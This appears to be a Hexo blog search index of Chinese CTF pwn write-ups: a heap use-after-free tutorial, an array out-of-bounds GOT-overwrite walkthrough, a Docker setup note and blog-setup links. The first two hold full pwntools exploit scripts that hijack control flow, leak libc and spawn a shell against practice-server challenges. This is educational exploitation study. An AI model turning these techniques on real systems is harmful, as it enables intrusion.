<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>堆入门学习之路</title>
    <link href="/2025/03/25/%E5%A0%86%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"/>
    <url>/2025/03/25/%E5%A0%86%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>找到他们的目录，然后在pwn题目文件目录下运行以下两条命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">patchelf --set-interpreter 。/ld-linux-x86-64.so.2 ./pwn<br> <br>patchelf --add-needed 你的文件目录/libc.so.6 ./pwn<br> <br>patchelf --add-needed 你的目录/libpthread.so.0 ./pwn （如果提示没有libpthread.so.0的话）<br> <br><span class="hljs-comment">#后来发现最好的命令、</span><br>patchelf --set-rpath 你的文件目录/ld-linux-x86-64.so.2 ./pwn<br></code></pre></td></tr></table></figure><h1 id="一、UAF"><a href="#一、UAF" class="headerlink" title="一、UAF"></a>一、UAF</h1><p>UAF即use after free，就是在程序使用malloc申请了内存并且写入了数据之后，通过free释放了堆块，但是没有清除数据，导致再次申请malloc时再次分配到这块内存，里面的数据被复用。（再次申请的堆块比之前申请的小）</p><h2 id="例题：actf-2019-babyheap"><a href="#例题：actf-2019-babyheap" class="headerlink" title="例题：actf_2019_babyheap"></a>例题：actf_2019_babyheap</h2><p>先对函数名称进行一下简单的修复</p><p><img src="https://raw.githubusercontent.com/vstralcn/image/main/image-20250326215158284.png" alt="image-20250326215158284"></p><p><img src="https://raw.githubusercontent.com/vstralcn/image/main/image-20250326215552620.png" alt="image-20250326215552620"></p><p>可以发现print输出函数的地址被存到了chunk里面</p><p><img src="https://raw.githubusercontent.com/vstralcn/image/main/image-20250326215744679.png" alt="image-20250326215744679"></p><p>在输出函数中，可以看到是利用chunk中保存的函数指针和数据来打印的，而且程序中有system函数和binsh字符串，所以可以利用起来，所以我们可以先分配3个堆块，然后释放堆块，因为重新分配相同大小的堆块时，会优先分配之前释放的内存区域，当我们生成0x10大小的堆块时，首先会生成一个0x10的函数块，然后是0x10的数据块，因为这两个都是0x10，所以就会再次分配到之前的两个堆块的位置，当我们在第二个堆块写入伪造的函数指针时，使用print第二个堆块，就会调用我们伪造的函数指针。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>file = <span class="hljs-string">&#x27;./ACTF_2019_babyheap&#x27;</span><br>i = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span>:<br>    io = process(file)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">27160</span>)<br>elf = ELF(file)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>sd = <span class="hljs-keyword">lambda</span> s : io.send(s)<br>sl = <span class="hljs-keyword">lambda</span> s : io.sendline(s)<br>sa = <span class="hljs-keyword">lambda</span> n,s : io.sendafter(n,s)<br>sla = <span class="hljs-keyword">lambda</span> n,s : io.sendlineafter(n,s)<br>rc = <span class="hljs-keyword">lambda</span> n : io.recv(n)<br>rl = <span class="hljs-keyword">lambda</span> : io.recvline()<br>ru = <span class="hljs-keyword">lambda</span> s : io.recvuntil(s)<br>ra = <span class="hljs-keyword">lambda</span> : io.recvall()<br>it = <span class="hljs-keyword">lambda</span> : io.interactive()<br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#---------- EXP ----------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Create</span>(<span class="hljs-params">size,data</span>):<br>    sa(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sa(<span class="hljs-string">b&#x27;Please input size: \n&#x27;</span>,size)<br>    sa(<span class="hljs-string">b&#x27;Please input content: \n&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Delete</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;Please input list index: \n&#x27;</span>,index)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Print</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;Please input list index: \n&#x27;</span>,index)<br><br>Create(<span class="hljs-string">b&#x27;128&#x27;</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>Create(<span class="hljs-string">b&#x27;128&#x27;</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>Create(<span class="hljs-string">b&#x27;128&#x27;</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<br><br><br>system = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = <span class="hljs-number">0x602010</span><br><br>pause()<br>Delete(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>Delete(<span class="hljs-string">b&#x27;0&#x27;</span>)<br><br>Create(<span class="hljs-string">b&#x27;16&#x27;</span>,p64(binsh) + p64(system))<br>gdb.attach(io)<br>Print(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>it()<br></code></pre></td></tr></table></figure><h1 id="二、off-by-one"><a href="#二、off-by-one" class="headerlink" title="二、off by one"></a>二、off by one</h1>]]></content>
    
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>堆</tag>
      
      <tag>入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker中配置ubuntu16.04环境</title>
    <link href="/2025/03/18/Docker%E4%B8%AD%E9%85%8D%E7%BD%AEubuntu16-04%E7%8E%AF%E5%A2%83/"/>
    <url>/2025/03/18/Docker%E4%B8%AD%E9%85%8D%E7%BD%AEubuntu16-04%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<p>利用docker部署pwn题目靶机环境</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">docker build -t ubuntu16_pwn .<br><br>docker run -it <span class="hljs-attr">--rm</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1337</span>:<span class="hljs-number">1337</span> <span class="hljs-attr">--add-host</span>=host<span class="hljs-selector-class">.docker</span><span class="hljs-selector-class">.internal</span>:host-gateway ubuntu16_pwn<br></code></pre></td></tr></table></figure><p>利用docker创建ubuntu16.04调试做题环境</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【PWN】数组溢出 越界读写</title>
    <link href="/2025/03/18/%E3%80%90PWN%E3%80%91%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99/"/>
    <url>/2025/03/18/%E3%80%90PWN%E3%80%91%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="一、作用"><a href="#一、作用" class="headerlink" title="一、作用"></a>一、作用</h1><p>数组越界读写是一类较为常见的漏洞，造成的原因在于对数组</p><h1 id="二、例题分析"><a href="#二、例题分析" class="headerlink" title="二、例题分析"></a>二、例题分析</h1><h2 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h2><p><img src="https://raw.githubusercontent.com/vstralcn/image/main/1737005471-image.png"></p><p><img src="https://raw.githubusercontent.com/vstralcn/image/main/1737005473-image.png"></p><p>程序仅仅检查了v0小于9，但是并没有检查输入值v0的正负</p><p>seats变量的位置是在bss区，我们可以通过改写got表来劫持控制流</p><p><img src="https://raw.githubusercontent.com/vstralcn/image/main/1737015389-image-1024x159.png"></p><h3 id="第一次执行main函数"><a href="#第一次执行main函数" class="headerlink" title="第一次执行main函数"></a>第一次执行main函数</h3><p>因为vuln函数结尾有一个exit函数，所以可以通过改写exit的got表来使得重复执行main函数来实现多次改写控制，通过计算位置(0x404040 - 0x4040A0) &#x2F; 16&#x3D; -96 &#x2F; 16 &#x3D; -6</p><p>所以可以通过第一次输入-6来控制read函数往exit的got表位置写入main函数的地址。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#第一次执行<span class="hljs-selector-tag">main</span><br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(b<span class="hljs-string">&#x27;-6&#x27;</span>) #覆盖exitGOT表为main函数使得能够重复执行<br>io<span class="hljs-selector-class">.sendline</span>(<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x4012d1))<br></code></pre></td></tr></table></figure><h3 id="第二次执行main函数"><a href="#第二次执行main函数" class="headerlink" title="第二次执行main函数"></a>第二次执行main函数</h3><p>第二次运行时候通过与第一次相似的计算可以将seat的地址指向read函数的got地址，然后puts函数就会输出read的地址，接收输出地址即可</p><p><img src="https://raw.githubusercontent.com/vstralcn/image/main/1737015870-image.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#第二次执行<span class="hljs-selector-tag">main</span><br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(b<span class="hljs-string">&#x27;-7&#x27;</span>) #泄露read的got表地址<br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;name&#x27;</span>)<br>io<span class="hljs-selector-class">.send</span>(b<span class="hljs-string">&#x27;\xc0&#x27;</span>) #不能改变read的got地址<br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;name is &#x27;</span>)<br>read_got = <span class="hljs-built_in">u64</span>(io<span class="hljs-selector-class">.recv</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;read got &gt;&gt;&gt;&gt; &quot;</span> + hex(read_got)</span></span>) #输出read got地址<br><br>#计算system binsh地址<br>libcbase = read_got - libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;read&#x27;</span>]</span><br>system = libcbase + libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;system&#x27;</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;libcbase  &gt;&gt;&gt;&gt;  &quot;</span> + hex(libcbase)</span></span>)<br></code></pre></td></tr></table></figure><h3 id="第三次执行main函数"><a href="#第三次执行main函数" class="headerlink" title="第三次执行main函数"></a>第三次执行main函数</h3><p>将binsh写入并且改写puts地址为system函数获得shell</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#第三次执行<span class="hljs-selector-tag">main</span><br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(b<span class="hljs-string">&#x27;-9&#x27;</span>) #覆盖<br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;name&#x27;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-built_in">p64</span>(system))<br>io<span class="hljs-selector-class">.interactive</span>()<br><br></code></pre></td></tr></table></figure><h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><br><span class="hljs-built_in">file</span> = <span class="hljs-string">&#x27;./vuln&#x27;</span><br><span class="hljs-comment">#io = process(file)</span><br>io = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">23608</span>)<br>elf = ELF(<span class="hljs-built_in">file</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc =  ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><span class="hljs-comment">#第一次执行main</span><br>io.recvuntil(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io.sendline(b<span class="hljs-string">&#x27;-6&#x27;</span>) <span class="hljs-comment">#覆盖exitGOT表为main函数使得能够重复执行</span><br>io.sendline(p64(<span class="hljs-number">0x4012d1</span>))<br><br><span class="hljs-comment">#第二次执行main</span><br>io.recvuntil(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io.sendline(b<span class="hljs-string">&#x27;-7&#x27;</span>) <span class="hljs-comment">#泄露read的got表地址</span><br>io.recvuntil(b<span class="hljs-string">&#x27;name&#x27;</span>)<br>io.<span class="hljs-built_in">send</span>(b<span class="hljs-string">&#x27;\xc0&#x27;</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;name is &#x27;</span>)<br>read_got = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>print(<span class="hljs-string">&quot;read got &gt;&gt;&gt;&gt; &quot;</span> + hex(read_got)) <span class="hljs-comment">#输出read got地址</span><br><br><span class="hljs-comment">#计算system binsh地址</span><br>libcbase = read_got - libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-keyword">system</span> = libcbase + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>print(<span class="hljs-string">&quot;libcbase  &gt;&gt;&gt;&gt;  &quot;</span> + hex(libcbase))<br><br><span class="hljs-comment">#第三次执行main</span><br>io.recvuntil(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io.sendline(b<span class="hljs-string">&#x27;-9&#x27;</span>) <span class="hljs-comment">#覆盖</span><br>io.recvuntil(b<span class="hljs-string">&#x27;name&#x27;</span>)<br>io.sendline(b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="hljs-keyword">system</span>))<br>io.interactive()<br></code></pre></td></tr></table></figure><p>在这道题过程中一直出了一个问题，一直打不通，经过了很长时间的检查才发现是（io.send(b’\xc0’)）这一步一开始写的sendline就会导致多发送一个\n导致read的GOT表被改写，从而导致libcbase计算错误，确实是不细心了</p>]]></content>
    
    
    
    <tags>
      
      <tag>数组溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/16/github%E5%AF%B9%E6%8E%A5picgo/"/>
    <url>/2025/03/16/github%E5%AF%B9%E6%8E%A5picgo/</url>
    
    <content type="html"><![CDATA[<h1 id="hexo-github-PicGo实现博客系统"><a href="#hexo-github-PicGo实现博客系统" class="headerlink" title="hexo + github + PicGo实现博客系统"></a><strong>hexo + github + PicGo实现博客系统</strong></h1><p><a href="https://blog.csdn.net/clearloe/article/details/139879493">Hexo 博客搭建并部署到 GitHub Pages(2024最新详细版)_github pages上部署hexo-CSDN博客</a></p><p><a href="https://blog.csdn.net/zhebushibiaoshifu/article/details/129455228">GitHub与PicGo搭建免费稳定图床并实现Typora内复制自动上传_typora复制的时候如何自动复制图片-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
